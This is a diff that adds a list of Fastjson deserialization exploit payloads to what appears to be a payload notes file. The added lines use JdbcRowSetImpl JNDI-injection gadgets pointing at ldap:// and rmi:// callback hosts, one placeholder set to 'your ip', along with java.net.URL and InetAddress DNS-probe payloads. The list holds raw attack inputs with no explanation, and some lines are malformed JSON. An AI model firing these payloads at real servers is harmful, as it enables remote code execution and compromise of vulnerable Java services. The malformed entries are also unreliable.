@@ -33,4 +33,27 @@ param={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://9jo6zi.dn
 
 param={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://your ip/","autoCommit":true}
 
+#####
+
+```
+
+{"orderNo":"B200414195915053000","partnerOrderNo":"DC200414593341","x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net","autoCommit":true}}
+
+
+{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net","autoCommit":true}}}
+
+
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net","autoCommit":true}
+{"@type":"java.net.Inet4Address","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
+{"@type":"java.net.Inet6Address","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
+{{"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}:"x"}
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}}""}
+{"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
+{"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net"}
+{{"@type":"java.net.URL","val":"http://ecu6ognvy7jundp446drfy5utlzdn2.burpcollaborator.net}
+
+```
+
+
 
